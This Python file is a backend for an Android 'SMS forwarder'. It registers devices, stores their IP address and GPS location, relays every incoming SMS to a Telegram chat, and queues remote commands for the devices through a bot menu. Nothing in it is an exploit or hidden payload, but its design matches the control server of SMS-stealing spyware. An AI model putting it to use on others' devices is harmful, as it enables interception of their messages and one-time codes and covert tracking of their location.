#!/usr/bin/env python3
import json, os, sqlite3, threading, time, uuid, subprocess, shutil
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

HOST = os.getenv('HOST', '127.0.0.1')
PORT = int(os.getenv('PORT', '8888'))
BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()
CHAT_ID = os.getenv('CHAT_ID', '').strip()
BACKEND_KEY = os.getenv('BACKEND_KEY', '').strip()
DB = os.getenv('DB_PATH', os.path.join(os.path.dirname(__file__), 'backend.db'))
LEASE_SECONDS = 45
ONLINE_SECONDS = 45
POLL_WAIT_SECONDS = 25
STOP = False
DB_LOCK = threading.RLock()
COMMAND_WAKE = threading.Condition()


def db():
    c = sqlite3.connect(DB, timeout=20)
    c.row_factory = sqlite3.Row
    return c


def init_db():
    with DB_LOCK, db() as c:
        c.execute('''CREATE TABLE IF NOT EXISTS devices(
            device_id TEXT PRIMARY KEY,
            device_name TEXT NOT NULL,
            model TEXT,
            app_version TEXT,
            paused INTEGER DEFAULT 0,
            sms_count INTEGER DEFAULT 0,
            last_sms_time INTEGER DEFAULT 0,
            battery INTEGER DEFAULT -1,
            last_seen REAL NOT NULL,
            ip_address TEXT DEFAULT '',
            latitude REAL,
            longitude REAL,
            location_accuracy REAL,
            location_time REAL DEFAULT 0
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS commands(
            id TEXT PRIMARY KEY,
            device_id TEXT NOT NULL,
            text TEXT NOT NULL,
            created REAL NOT NULL,
            lease_until REAL DEFAULT 0,
            acknowledged INTEGER DEFAULT 0,
            result TEXT DEFAULT '',
            reply_sent INTEGER DEFAULT 0,
            reply_attempts INTEGER DEFAULT 0,
            last_reply_try REAL DEFAULT 0
        )''')
        c.execute('CREATE INDEX IF NOT EXISTS idx_commands_device ON commands(device_id, acknowledged, created)')
        c.execute('CREATE INDEX IF NOT EXISTS idx_commands_reply ON commands(acknowledged, reply_sent, created)')
        c.commit()


def upsert_device(p, peer_ip=''):
    did = str(p.get('device_id', '')).strip()
    if not did:
        raise ValueError('device_id required')
    # Prefer the IP reported by the device, while retaining the backend peer when unavailable.
    ip = str(p.get('local_ip', '') or peer_ip or '')
    vals = (
        did,
        str(p.get('device_name', 'Unknown')),
        str(p.get('model', '')),
        str(p.get('app_version', '')),
        1 if p.get('paused') else 0,
        int(p.get('sms_count', 0) or 0),
        int(p.get('last_sms_time', 0) or 0),
        int(p.get('battery', -1) or -1),
        time.time(), ip,
        float(p['latitude']) if p.get('latitude') is not None else None,
        float(p['longitude']) if p.get('longitude') is not None else None,
        float(p['location_accuracy']) if p.get('location_accuracy') is not None else None,
        float(p.get('location_time', 0) or 0),
    )
    with DB_LOCK, db() as c:
        c.execute('''INSERT INTO devices(
            device_id,device_name,model,app_version,paused,sms_count,last_sms_time,battery,
            last_seen,ip_address,latitude,longitude,location_accuracy,location_time
        ) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)
        ON CONFLICT(device_id) DO UPDATE SET
            device_name=excluded.device_name,
            model=excluded.model,
            app_version=excluded.app_version,
            paused=excluded.paused,
            sms_count=excluded.sms_count,
            last_sms_time=excluded.last_sms_time,
            battery=excluded.battery,
            last_seen=excluded.last_seen,
            ip_address=excluded.ip_address,
            latitude=excluded.latitude,
            longitude=excluded.longitude,
            location_accuracy=excluded.location_accuracy,
            location_time=excluded.location_time''', vals)
        c.commit()


def get_devices():
    with DB_LOCK, db() as c:
        return [dict(r) for r in c.execute('SELECT * FROM devices ORDER BY device_name, device_id').fetchall()]


def device_by_id(did):
    with DB_LOCK, db() as c:
        r = c.execute('SELECT * FROM devices WHERE device_id=?', (did,)).fetchone()
        return dict(r) if r else None


def enqueue(device_id, text):
    with DB_LOCK, db() as c:
        # Do not create duplicate copies of the same unacknowledged command.
        r = c.execute('''SELECT id FROM commands
                         WHERE device_id=? AND text=? AND acknowledged=0
                         ORDER BY created DESC LIMIT 1''', (device_id, text)).fetchone()
        if r:
            return r['id'], False
        cid = uuid.uuid4().hex
        c.execute('''INSERT INTO commands(
            id,device_id,text,created,lease_until,acknowledged,result,reply_sent,reply_attempts,last_reply_try
        ) VALUES(?,?,?,?,0,0,'',0,0,0)''', (cid, device_id, text, time.time()))
        c.commit()
    with COMMAND_WAKE:
        COMMAND_WAKE.notify_all()
    return cid, True


def poll_command(device_id, wait_seconds=0):
    def claim():
        now = time.time()
        with DB_LOCK, db() as c:
            row = c.execute('''SELECT * FROM commands
                               WHERE device_id=? AND acknowledged=0
                               AND (lease_until=0 OR lease_until<?)
                               ORDER BY created LIMIT 1''', (device_id, now)).fetchone()
            if not row:
                return None
            c.execute('UPDATE commands SET lease_until=? WHERE id=?', (now + LEASE_SECONDS, row['id']))
            c.commit()
            return dict(row)

    cmd = claim()
    if cmd is not None or wait_seconds <= 0:
        return cmd
    deadline = time.monotonic() + min(float(wait_seconds), POLL_WAIT_SECONDS)
    while not STOP:
        rem = deadline - time.monotonic()
        if rem <= 0:
            return claim()
        with COMMAND_WAKE:
            COMMAND_WAKE.wait(timeout=rem)
        cmd = claim()
        if cmd is not None:
            return cmd
    return None


def ack(device_id, cid, result=''):
    with DB_LOCK, db() as c:
        row = c.execute('SELECT acknowledged,reply_sent FROM commands WHERE id=? AND device_id=?', (cid, device_id)).fetchone()
        if not row:
            return False, False
        already = bool(row['acknowledged'])
        sent = bool(row['reply_sent'])
        c.execute('''UPDATE commands SET acknowledged=1,result=?,lease_until=0
                     WHERE id=? AND device_id=?''', (result, cid, device_id))
        c.commit()
        return (not already), (bool(result) and not sent)


def telegram(method, payload, retries=(0, 1, 2, 4, 8)):
    """Call Telegram Bot API using Termux curl, with bounded retry/backoff.

    curl works reliably in this Termux environment where Python urllib has
    intermittently failed DNS/connection resolution. The token is supplied
    only as an argument; it is never printed.
    """
    if not BOT_TOKEN:
        raise RuntimeError('BOT_TOKEN not configured')
    curl = shutil.which('curl')
    if not curl:
        raise RuntimeError('curl not installed')
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/{method}'
    body = json.dumps(payload, ensure_ascii=False, separators=(',', ':'))
    last = None
    for delay in retries:
        if delay:
            time.sleep(delay)
        try:
            proc = subprocess.run(
                [curl, '-sS', '--fail-with-body', '--connect-timeout', '10',
                 '--max-time', '40', '-H', 'Content-Type: application/json',
                 '--data', body, url],
                capture_output=True, text=True, timeout=50
            )
            raw = proc.stdout or proc.stderr
            if proc.returncode != 0:
                last = RuntimeError(f'curl exit {proc.returncode}: {raw[-500:]}')
                continue
            result = json.loads(raw)
            if result.get('ok'):
                return result
            # Telegram 409 is meaningful: do not spin aggressively.
            if result.get('error_code') == 409:
                raise RuntimeError(f"Telegram 409: {result.get('description', '')}")
            last = RuntimeError(str(result))
        except subprocess.TimeoutExpired as e:
            last = e
        except Exception as e:
            last = e
    raise last or RuntimeError('Telegram request failed')


def send(text, reply_markup=None):
    payload = {'chat_id': CHAT_ID, 'text': text}
    if reply_markup is not None:
        payload['reply_markup'] = reply_markup
    try:
        telegram('sendMessage', payload)
        return True
    except Exception as e:
        print('telegram send error:', e, flush=True)
        return False


def answer_callback(callback_id, text=''):
    if not callback_id:
        return
    try:
        telegram('answerCallbackQuery', {'callback_query_id': callback_id, 'text': text})
    except Exception:
        pass


def main_keyboard():
    return {'inline_keyboard': [
        [{'text': '▶️ Start', 'callback_data': 'menu:start'}, {'text': 'ℹ️ Help', 'callback_data': 'menu:help'}],
        [{'text': '📱 Devices', 'callback_data': 'menu:devices'}, {'text': '🔄 Refresh', 'callback_data': 'menu:refresh'}],
    ]}


def help_text():
    return ('🛠 SMS FORWARDER — COMMANDS\n\n'
            '▶️ Start — open control menu\n'
            'ℹ️ Help — show commands\n'
            '📱 Devices — list all registered devices\n'
            '📊 Status — live device status\n'
            '⏸ Pause — pause SMS forwarding on one device\n'
            '▶️ Resume — resume SMS forwarding\n'
            '📋 Log — recent SMS log\n'
            'ℹ️ Device Info — ID, model, app, battery, IP and GPS*\n'
            '🧪 Test — verify command path\n'
            '🩺 Health — live app/backend/device health\n'
            '🧹 Clear Log — clear on one device\n'
            '🔄 Reset Stats — reset counters on one device\n'
            '♻️ Reload — reload command listener\n'
            '🔄 Restart Service — restart Android foreground service\n'
            '🔁 Re-register — refresh device registration\n'
            '🌐 Backend — authenticated backend + device health\n'
            '🔄 Refresh — refresh devices\n\n'
            '* GPS is shown only when Android location permission is available.\n'
            'All device commands are routed through the central Termux backend.')


def control_menu():
    return {'inline_keyboard': [
        [{'text': '📊 Status', 'callback_data': 'pick:Status'}, {'text': '⏸ Pause', 'callback_data': 'pick:Pause'}],
        [{'text': '▶️ Resume', 'callback_data': 'pick:Resume'}, {'text': '📋 Log', 'callback_data': 'pick:Log'}],
        [{'text': 'ℹ️ Device Info', 'callback_data': 'pick:Device Info'}, {'text': '🧪 Test', 'callback_data': 'pick:Test'}],
        [{'text': '🩺 Health', 'callback_data': 'pick:Health'}, {'text': '🌐 Backend', 'callback_data': 'pick:BackendHealth'}],
        [{'text': '🧹 Clear Log', 'callback_data': 'pick:ClearLog'}, {'text': '🔄 Reset Stats', 'callback_data': 'pick:ResetStats'}],
        [{'text': '♻️ Reload', 'callback_data': 'pick:Reload'}, {'text': '🔄 Restart Service', 'callback_data': 'pick:RestartService'}],
        [{'text': '🔁 Re-register', 'callback_data': 'pick:Reregister'}, {'text': '↩️ Back', 'callback_data': 'menu:start'}],
    ]}


def devices_keyboard(action=None):
    rows = []
    for d in get_devices():
        online = (time.time() - float(d.get('last_seen', 0))) <= ONLINE_SECONDS
        label = f"{d['device_name']} [{d['device_id'][:6]}] {'🟢' if online else '🔴'}"
        if action:
            rows.append([{'text': label, 'callback_data': f'do|{action}|{d["device_id"]}'}])
        else:
            rows.append([{'text': label, 'callback_data': f'info|{d["device_id"]}'}])
    rows.append([{'text': '↩️ Back', 'callback_data': 'menu:start'}])
    return {'inline_keyboard': rows}


def device_status_line(d):
    online = (time.time() - float(d.get('last_seen', 0))) <= ONLINE_SECONDS
    state = '⏸ PAUSED' if d.get('paused') else '▶️ ACTIVE'
    ip = d.get('ip_address') or 'Not available'
    lat, lon = d.get('latitude'), d.get('longitude')
    gps = f"📍 GPS: {float(lat):.6f}, {float(lon):.6f}" if lat is not None and lon is not None else '📍 GPS: Not available'
    age = int(max(0, time.time() - float(d.get('last_seen', 0))))
    return (f"📱 {d['device_name']}\n\n"
            f"{'🟢 ONLINE' if online else '🔴 OFFLINE'} | {state}\n"
            f"🆔 ID: {d['device_id']}\n"
            f"📲 Model: {d.get('model', '')}\n"
            f"📦 App: {d.get('app_version', '')}\n"
            f"🔋 Battery: {d.get('battery', -1)}%\n"
            f"💬 SMS: {d.get('sms_count', 0)}\n"
            f"🌐 IP: {ip}\n{gps}\n"
            f"⏱ Last seen: {age}s ago")


def queue_action(action, device_id):
    d = device_by_id(device_id)
    if not d:
        return '⚠️ Device is no longer registered.'
    cmd = 'StatusInfo' if action == 'Device Info' else action
    cid, created = enqueue(device_id, cmd)
    online = (time.time() - float(d.get('last_seen', 0))) <= ONLINE_SECONDS
    if created:
        prefix = '✅ Command queued'
    else:
        prefix = '↪️ Already queued'
    if online:
        return f'{prefix}: {action} → {d["device_name"]} [{device_id[:6]}]'
    return f'⏳ {d["device_name"]} is offline. {action} is queued for its next connection.'


def retry_unsent_replies():
    while not STOP:
        try:
            now = time.time()
            with DB_LOCK, db() as c:
                rows = c.execute('''SELECT id,device_id,result FROM commands
                                    WHERE acknowledged=1 AND reply_sent=0 AND result<>''
                                    AND (last_reply_try=0 OR last_reply_try<?)
                                    ORDER BY created LIMIT 20''', (now - 5,)).fetchall()
            for row in rows:
                cid, did, result = row['id'], row['device_id'], row['result']
                with DB_LOCK, db() as c:
                    c.execute('UPDATE commands SET reply_attempts=reply_attempts+1,last_reply_try=? WHERE id=?', (now, cid))
                    c.commit()
                if send(f'📩 {result}'):
                    with DB_LOCK, db() as c:
                        c.execute('UPDATE commands SET reply_sent=1 WHERE id=? AND device_id=?', (cid, did))
                        c.commit()
        except Exception as e:
            print('reply retry error:', e, flush=True)
        time.sleep(3)


def bot_loop():
    global STOP
    off_file = os.path.join(os.path.dirname(__file__), 'telegram_offset.txt')
    try:
        telegram('deleteWebhook', {'drop_pending_updates': False})
    except Exception as e:
        print('deleteWebhook:', e, flush=True)
    try:
        with open(off_file, encoding='utf-8') as f:
            offset = int(f.read().strip() or 0)
    except Exception:
        offset = 0

    while not STOP:
        try:
            res = telegram('getUpdates', {
                'timeout': POLL_WAIT_SECONDS,
                'offset': offset,
                'allowed_updates': ['message', 'callback_query'],
            })
            for upd in res.get('result', []):
                offset = max(offset, int(upd.get('update_id', 0)) + 1)
                try:
                    tmp = off_file + '.tmp'
                    with open(tmp, 'w', encoding='utf-8') as f:
                        f.write(str(offset)); f.flush(); os.fsync(f.fileno())
                    os.replace(tmp, off_file)
                except Exception:
                    pass

                cb = upd.get('callback_query')
                if cb:
                    msg = cb.get('message') or {}
                    if str(msg.get('chat', {}).get('id')) != str(CHAT_ID):
                        continue
                    data = str(cb.get('data', ''))
                    answer_callback(str(cb.get('id', '')))
                    if data == 'menu:start':
                        send('📱 SMS FORWARDER CONTROL', control_menu())
                    elif data == 'menu:help':
                        send(help_text(), main_keyboard())
                    elif data == 'menu:devices':
                        send('📱 Registered devices:', devices_keyboard())
                    elif data == 'menu:refresh':
                        send(f'🔄 Devices: {len(get_devices())}', main_keyboard())
                    elif data.startswith('pick:'):
                        action = data.split(':', 1)[1]
                        send(f'📱 Select device for {action}:', devices_keyboard(action))
                    elif data == 'menu:back':
                        send('📱 SMS FORWARDER CONTROL', control_menu())
                    elif data.startswith('info|'):
                        did = data.split('|', 1)[1]
                        d = device_by_id(did)
                        if d:
                            send(device_status_line(d), control_menu())
                        else:
                            send('⚠️ Device not found.', control_menu())
                    elif data.startswith('do|'):
                        parts = data.split('|', 2)
                        if len(parts) == 3 and parts[1] in ('Resume','Pause','Log','Status','Device Info','Test','Health','BackendHealth','ClearLog','ResetStats','Reload','RestartService','Reregister'):
                            action, did = parts[1], parts[2]
                            # Remove the picker after a click to make repeated taps impossible.
                            try:
                                telegram('editMessageReplyMarkup', {
                                    'chat_id': CHAT_ID,
                                    'message_id': msg.get('message_id'),
                                    'reply_markup': {'inline_keyboard': []},
                                })
                            except Exception:
                                pass
                            send(queue_action(action, did))
                    continue

                msg = upd.get('message') or {}
                if str(msg.get('chat', {}).get('id')) != str(CHAT_ID):
                    continue
                text = str(msg.get('text', '')).strip()
                if not text:
                    continue
                low = text.lower()
                if low in ('/start', 'start'):
                    send('📱 SMS FORWARDER CONTROL', control_menu())
                elif low in ('/help', 'help'):
                    send(help_text(), main_keyboard())
                elif low in ('/devices', 'devices', 'refresh'):
                    send('📱 Registered devices:', devices_keyboard())
                elif text in ('Resume','Pause','Log','Status','Device Info','Test','Health','BackendHealth','ClearLog','ResetStats','Reload','RestartService','Reregister'):
                    send_device_picker(text)
        except HTTPError as e:
            if e.code == 409:
                print('telegram polling conflict (409): another consumer is active', flush=True)
                time.sleep(8)
            else:
                print('telegram HTTP error:', e, flush=True)
                time.sleep(3)
        except (URLError, ConnectionError, OSError) as e:
            print('telegram network error:', e, flush=True)
            time.sleep(2)
        except Exception as e:
            print('telegram loop error:', e, flush=True)
            time.sleep(2)


def send_device_picker(action):
    devs = get_devices()
    if not devs:
        send('⚠️ No devices registered yet. Keep the APK open and try again.', main_keyboard())
        return
    send(f'📱 Select device for {action}:', devices_keyboard(action))


class ReusableThreadingHTTPServer(ThreadingHTTPServer):
    allow_reuse_address = True
    daemon_threads = True


class Handler(BaseHTTPRequestHandler):
    def _json(self, code, obj):
        body = json.dumps(obj, separators=(',', ':'), ensure_ascii=False).encode()
        self.send_response(code)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        self.send_header('Cache-Control', 'no-store')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _auth(self):
        return bool(BACKEND_KEY) and self.headers.get('X-Backend-Key', '') == BACKEND_KEY

    def _body(self):
        n = int(self.headers.get('Content-Length', '0'))
        return json.loads(self.rfile.read(n).decode() or '{}')

    def do_GET(self):
        p = urlparse(self.path)
        q = parse_qs(p.query)
        if p.path == '/health':
            self._json(200, {'ok': True})
            return
        if not self._auth():
            self._json(401, {'ok': False, 'error': 'unauthorized'})
            return
        if p.path == '/api/v1/poll':
            did = (q.get('device_id') or [''])[0]
            try: wait = float((q.get('wait') or ['0'])[0])
            except ValueError: wait = 0
            self._json(200, {'ok': True, 'command': poll_command(did, wait) if did else None})
            return
        if p.path == '/api/v1/devices':
            out = []
            for d in get_devices():
                d['online'] = (time.time() - float(d.get('last_seen', 0))) <= ONLINE_SECONDS
                out.append(d)
            self._json(200, {'ok': True, 'devices': out})
            return
        if p.path == '/api/v1/health':
            did = (q.get('device_id') or [''])[0].strip()
            d = device_by_id(did) if did else None
            last_seen = float(d.get('last_seen', 0)) if d else 0
            online = bool(d and (time.time() - last_seen) <= ONLINE_SECONDS)
            self._json(200, {
                'ok': True,
                'server_time': time.time(),
                'device_registered': bool(d),
                'device_online': online,
                'device_last_seen': last_seen,
            })
            return
        self._json(404, {'ok': False, 'error': 'not_found'})

    def do_POST(self):
        p = urlparse(self.path)
        if not self._auth():
            self._json(401, {'ok': False, 'error': 'unauthorized'})
            return
        try:
            body = self._body()
        except Exception as e:
            self._json(400, {'ok': False, 'error': f'bad_json:{e}'})
            return
        try:
            if p.path in ('/api/v1/register', '/api/v1/heartbeat'):
                peer_ip = self.client_address[0] if self.client_address else ''
                upsert_device(body, peer_ip)
                self._json(200, {'ok': True})
                return
            if p.path == '/api/v1/ack':
                did = str(body.get('device_id', ''))
                cid = str(body.get('id', ''))
                result = str(body.get('result', ''))
                _, should = ack(did, cid, result)
                if should:
                    if send(f'📩 {result}'):
                        with DB_LOCK, db() as c:
                            c.execute('UPDATE commands SET reply_sent=1 WHERE id=? AND device_id=?', (cid, did))
                            c.commit()
                self._json(200, {'ok': True})
                return
            if p.path == '/api/v1/event':
                did = str(body.get('device_id', '')).strip()
                kind = str(body.get('kind', 'event')).strip()[:32]
                text = str(body.get('text', '')).strip()[:3500]
                if not did or not text:
                    self._json(400, {'ok': False, 'error': 'device_id and text required'})
                    return
                d = device_by_id(did)
                if not d:
                    self._json(404, {'ok': False, 'error': 'device_not_registered'})
                    return
                # Device-generated events are informational only. Authentication
                # credentials are intentionally not handled by this endpoint.
                if kind == 'sms':
                    send(f"💬 {d['device_name']}\n{text}")
                elif kind == 'test':
                    send(f"🧪 {d['device_name']}\n{text}")
                else:
                    send(f"ℹ️ {d['device_name']}\n{text}")
                self._json(200, {'ok': True})
                return
            self._json(404, {'ok': False, 'error': 'not_found'})
        except Exception as e:
            self._json(400, {'ok': False, 'error': str(e)})

    def log_message(self, fmt, *args):
        return


def main():
    init_db()
    # Bind first so a port failure cannot leave a Telegram polling thread
    # running in a half-started backend.
    httpd = ReusableThreadingHTTPServer((HOST, PORT), Handler)
    print(f'Backend listening on {HOST}:{PORT}', flush=True)
    threading.Thread(target=bot_loop, daemon=True, name='telegram-loop').start()
    threading.Thread(target=retry_unsent_replies, daemon=True, name='reply-retry').start()
    try:
        httpd.serve_forever()
    finally:
        global STOP
        STOP = True
        httpd.server_close()


if __name__ == '__main__':
    main()
